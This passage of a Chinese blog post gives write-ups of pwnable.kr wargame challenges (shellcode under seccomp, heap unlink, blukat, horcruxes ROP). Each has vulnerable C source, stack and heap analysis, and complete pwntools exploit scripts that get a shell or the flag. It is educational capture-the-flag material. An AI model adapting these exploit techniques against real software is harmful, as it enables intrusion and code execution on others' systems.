<p>通过此特性初始化SCMP_ACT_KILL限制了所有 syscall，后添加规则允许使用的仅为 open read write exit exit_group</p>
<p>我们需要做的便是：</p>
<ol>
<li>打开(open) flag 文件</li>
<li>读取(read) flag 文件</li>
<li>写(write) 文件内容写到标准输出(stdout)</li>
</ol>
<p>对入门不会生成 shellcode 的我，pwnlib 提供了 shellcraft，<strong>注意发送时需要调用 asm 方法编译汇编码</strong></p>
<hr>
<ul>
<li><a href="https://www.man7.org/linux/man-pages/man2/syscall.2.html" target="_blank" rel="noopener">Linux Programmer’s Manual </a></li>
<li><a href="https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux" target="_blank" rel="noopener">X86 Assembly/Interfacing with Linux</a></li>
</ul>
<p>从上面的资料可知文件句柄是通过 rax 返回的，所以我们直接从 rax 读取文件即可，但实际上linux文件句柄(fd)是从 3 开始增长的，因为我们第一个也只打开一个，所以必定是 3</p>
<h3 id="解题-17"><a href="#解题-17" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'DEBUG'</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> <span class="token number">9026</span><span class="token punctuation">)</span>
sc <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># sc += shellcraft.read("rax", "rsp", 100)</span>
sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"rsp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"rsp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h2 id="19-unlink"><a href="#19-unlink" class="headerlink" title="19. unlink"></a>19. unlink</h2><h3 id="题目-18"><a href="#题目-18" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> tagOBJ<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> fd<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> bk<span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>OBJ<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">unlink</span><span class="token punctuation">(</span>OBJ<span class="token operator">*</span> P<span class="token punctuation">)</span><span class="token punctuation">{</span>
    OBJ<span class="token operator">*</span> BK<span class="token punctuation">;</span>
    OBJ<span class="token operator">*</span> FD<span class="token punctuation">;</span>
    BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>
    FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>
    FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>
    BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    OBJ<span class="token operator">*</span> A <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    OBJ<span class="token operator">*</span> B <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    OBJ<span class="token operator">*</span> C <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// double linked list: A &lt;-> B &lt;-> C</span>
    A<span class="token operator">-></span>fd <span class="token operator">=</span> B<span class="token punctuation">;</span>
    B<span class="token operator">-></span>bk <span class="token operator">=</span> A<span class="token punctuation">;</span>
    B<span class="token operator">-></span>fd <span class="token operator">=</span> C<span class="token punctuation">;</span>
    C<span class="token operator">-></span>bk <span class="token operator">=</span> B<span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is stack address leak: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is heap address leak: %p\n"</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now that you have leaks, get shell!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// heap overflow!</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>A<span class="token operator">-></span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// exploit this unlink!</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>首先先看了 double-free 的利用，即 unlink 的一种利用是通过劫持GOT表实现命令执行，但是题目中 Unlink 后没有跟其他函数的，所以无法利用</p>
<p>那么能否直接操控 main 返回地址来实现跳转到 shellcode 执行呢？看下 main 最后的汇编是怎么写的</p>
<pre class=" language-armasm"><code class="language-armasm">0x080485ff <+208>:    mov    ecx,DWORD PTR [ebp-0x4]
0x08048602 <+211>:    leave  
0x08048603 <+212>:    lea    esp,[ecx-0x4]
0x08048606 <+215>:    ret </code></pre>
<p>翻译过来</p>
<pre class=" language-armsam"><code class="language-armsam">mov    ecx,[ebp-0x4]
mov    esp,ebp
pop    ebp
lea    esp,[ecx-0x4]
ret</code></pre>
<p>此时栈内分布</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15918589934469.jpg" alt="-w790"></p>
<p>我们无法直接控制 eip，那么能否通过控制 ebp -&gt; ecx -&gt; esp -&gt; eip 实现呢</p>
<p>我们首先关注到 unlink</p>
<pre class=" language-c"><code class="language-c">BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>
FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>
FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>
BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span></code></pre>
<p>如下：</p>
<pre class=" language-plain"><code class="language-plain">BK = *(P + 4)
FD = *(P)
FD -> bk = BK -> *(*(P)+4) = *(P + 4)
BK -> fd = FD -> *(*(P+4)) = *(P)</code></pre>
<p>更直白的说</p>
<pre class=" language-plain"><code class="language-plain">*(*(P->fd) + 4) = *(P->bk) 将 fd 的值 +4 作为地址，其值为 bk 的值
*(*(P->bk)) = *(P->fd) 将 bk 的值作为地址，其值为 fd 的值</code></pre>
<p>即我们通过控制 fd bk 可以获取到两次写内存的机会</p>
<ol>
<li>利用 BK -&gt; fd = FD，bk 控制地址，fd 控制值</li>
<li>利用 FD -&gt; bk = BK，fd 控制地址，bk 控制值</li>
</ol>
<p>其次把已知条件列出来</p>
<ul>
<li>eip = [esp]</li>
<li>esp = ecx - 0x4</li>
<li>ecx = [ebp - 0x4]</li>
</ul>
<p>再根据栈中内容，可得</p>
<ul>
<li>stack_A + 0x10 = ebp - 0x4</li>
</ul>
<p>由于我们可以通过 A-&gt;buf 进行 overflow，假设我们将func_shell放在buf前4个字节，同时我们把buf地址标记为 shellcode，那么就有</p>
<ul>
<li>[heap_A + 0x8] = [shellcode] = func_shell = eip</li>
<li>shellcode = esp = ecx - 0x4 =&gt; heap_A + 0x8 = ecx - 0x4</li>
</ul>
<p>我们的目标是通过控制 fd bk 进而控制栈内存储的 ecx，进而控制 esp eip，我们先选取<code>bk 地址 fd 值</code>的利用方式即<code>BK-&gt;fd=FD</code>，有</p>
<ul>
<li>[bk] = &amp;ecx</li>
<li>[fd] = ecx</li>
</ul>
<p>结合上面的条件，推得</p>
<ul>
<li>[bk] = ebp - 0x4 = stack_A + 0x10</li>
<li>[fd] = heap_A + 0xc</li>
</ul>
<p>以此设置布局如下：</p>
<pre class=" language-plain"><code class="language-plain">0                 4                 8
+-----------------+-----------------+ heapA
|        fd       |        bk       |
+-----------------+-----------------+ A -> buf
|   *func_shell   |    ~padding~    |
+-----------------+-----------------+ heapB-header
|             ~padding~             |
+-----------------+-----------------+ heapB
|   heap_A + 0xc  |  stack_A + 0x10 |
+-----------------+-----------------+ </code></pre>
<hr>
<p>假如我们选择<code>fd 地址 bk 值</code>的方式<code>FD-&gt;bk=BK</code>，有</p>
<ul>
<li>[bk] = ecx</li>
<li>[fd] + 0x4 = &amp;ecx</li>
</ul>
<p>推得</p>
<ul>
<li>[bk] = heap_A + 0xc</li>
<li>[fd] = ebp - 0x4 - 0x4 = stack_A + 0x10 - 0x4 = stack_A + 0xc</li>
</ul>
<pre class=" language-plain"><code class="language-plain">0                 4                 8
+-----------------+-----------------+ heapA
|        fd       |        bk       |
+-----------------+-----------------+ A -> buf
|   *func_shell   |    ~padding~    |
+-----------------+-----------------+ heapB-header
|             ~padding~             |
+-----------------+-----------------+ heapB
|  stack_A + 0xc  |   heap_A + 0xc  |
+-----------------+-----------------+ </code></pre>
<h3 id="解题-18"><a href="#解题-18" class="headerlink" title="解题"></a>解题</h3><p>做完题后再想了几遍构造原理，感觉通透了不少</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span>

is_remote <span class="token operator">=</span> <span class="token boolean">True</span>
method <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment" spellcheck="true"># 1 or 2</span>

<span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>
    s <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'unlink'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/home/unlink/unlink"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/pwn/Desktop/unlink"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here is stack address leak: "</span><span class="token punctuation">)</span>
stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here is heap address leak: "</span><span class="token punctuation">)</span>
heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"get shell!\n"</span><span class="token punctuation">)</span>

shell_addr <span class="token operator">=</span> <span class="token number">0x080484eb</span>

<span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
    fd <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xc</span>
    bk <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x10</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    fd <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0xc</span>
    bk <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xc</span>

payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">"."</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>fd<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bk<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h2 id="20-blukat"><a href="#20-blukat" class="headerlink" title="20. blukat"></a>20. blukat</h2><h3 id="题目-19"><a href="#题目-19" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token string">"3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+"</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">calc_flag</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/home/blukat/password"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"congrats! here is your flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">calc_flag</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong guess!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><p>…脑洞题，password为<code>cat: password: Permission denied</code>，就是为了提醒注意文件权限</p>
<h3 id="解题-19"><a href="#解题-19" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>


s <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'blukat'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/home/blukat/blukat"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat: password: Permission denied"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h2 id="21-horcruxes"><a href="#21-horcruxes" class="headerlink" title="21. horcruxes"></a>21. horcruxes</h2><h3 id="题目-20"><a href="#题目-20" class="headerlink" title="题目"></a>题目</h3><p>需要<code>sudo apt install libseccomp-dev:i386</code></p>
<h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>有个名为 ropme 的函数，主要关注这里，其功能判断输入值是否为 sum，是的话则返回 flag<br>可以明显看到数组<code>s</code>有溢出，但是怎么利用呢？</p>
<ol>
<li>直接控制 ropme 返回地址到 open flag 的地址</li>
<li>获取 a~g 的变量值通过 sum 验证</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921305968734.jpg" alt="-w469"></p>
<p>首先检查看到是没有开启 ASLR 地址是固定利用的，接着往下走</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921446659641.jpg" alt="-w307"></p>
<p>第一种方法中，由于跳转地址含有<code>0x0a</code>导致无法有效从 gets 输入，所以只能考虑第二种方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921431564969.jpg" alt="-w469"></p>
<p>我们看到 A~G 函数都是无参函数，且执行 printf 后 ret 返回，所以在栈上表现为返回执行原函数下一地址指令</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921433549736.jpg" alt="-w474"></p>
<p>我们通过把栈覆盖如下，当输入不等于 sum 时，ropme 即会跳转调用 A 函数输出 a，当从 A 函数返回时便会调用 B 函数……当 A~G 都执行完毕后计算 sum 值，再次调回 ropme 输入正确答案即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921442969783.jpg" alt="-w304"></p>
<h3 id="解题-20"><a href="#解题-20" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>

is_remote <span class="token operator">=</span> <span class="token number">1</span>

<span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9032</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/pwn/Desktop/horcruxes"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> b<span class="token string">'.'</span> <span class="token operator">*</span> <span class="token number">0x78</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe4b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># A</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># B</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe89</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># C</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fea8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># D</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fec7</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># E</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fee6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># F</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809ff05</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># G</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fffc</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ropme</span>

p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Select Menu:"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How many EXP did you earned? : "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

sum <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    msg <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> int<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">')\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    sum <span class="token operator">+=</span> num

p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Select Menu:"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How many EXP did you earned? : "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">LINUX SYSTEM CALL TABLE FOR X86 64</a></li>
<li><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">linux程序的常用保护机制</a></li>
<li><a href="http://0x4c43.cn/2017/1024/linux-memory-management-and-heap/" target="_blank" rel="noopener">Linux 内存管理与堆</a></li>
<li><a href="https://segmentfault.com/a/1190000005118060" target="_blank" rel="noopener">Linux堆内存管理深入分析（上）</a></li>
<li><a href="https://segmentfault.com/a/1190000005183474" target="_blank" rel="noopener">Linux堆内存管理深入分析（下）</a></li>
<li><a href="https://wiki.x10sec.org/pwn/heap/heap_implementation_details/" target="_blank" rel="noopener">深入理解堆的实现</a></li>
<li><a href="https://www.bilibili.com/video/av200358962/" target="_blank" rel="noopener">从栈溢出开始，教你写Shellcode和ROP链</a></li>
</ol>
    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者：<a href="https://blog.sari3l.com">Sariel.D</a>
            <p>原文链接：<a href="https://blog.sari3l.com/posts/d4fb29f2/">https://blog.sari3l.com/posts/d4fb29f2/</a>
            <p>发表日期：<a href="https://blog.sari3l.com/posts/d4fb29f2/">June 14th 2020, 10:54:02 pm</a>
            <p>更新日期：<a href="https://blog.sari3l.com/posts/d4fb29f2/">July 6th 2020, 5:45:14 pm</a>
            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/posts/608d18f0/" title= "用友NC反序列化 简单分析">
                    <div class="nextTitle">用友NC反序列化 简单分析</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/posts/ecb4dfa2/" title= "Weblogic T3 协议学习">
                    <div class="prevTitle">Weblogic T3 协议学习</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!-- gitalk评论 -->

    <!-- utteranc评论 -->

    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

